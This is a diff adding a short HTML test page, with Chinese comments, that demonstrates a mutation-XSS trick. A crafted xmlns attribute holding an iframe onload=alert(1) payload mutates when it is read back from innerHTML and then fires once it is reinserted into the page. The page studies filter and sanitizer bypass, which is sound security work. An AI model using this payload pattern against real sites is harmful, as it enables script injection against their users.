@@ -1,0 +1,20 @@
+#!html
+<div id="testa">xx</div>
+<div id="testb">xx</div>
+
+<script>
+//请自行将输入的HTML代码中的双引号以及 \进行转义操作
+//其中： " -> \" , \ -> \\
+var m="<pkav xmlns=\"><iframe onload=alert(1)\">123</pkav>"; 
+
+//1. 将用户输入内容放入innerHTML
+var x=document.getElementById("testa");
+x.innerHTML=m;
+//2. 发生突变后，取出突变后的内容，放入html变量
+var html=x.innerHTML;
+//3. 弹出突变后的代码
+alert(html); 
+//4. 将突变后的代码输出到DOM中
+document.getElementById("testb").innerHTML = html;
+
+</script> 
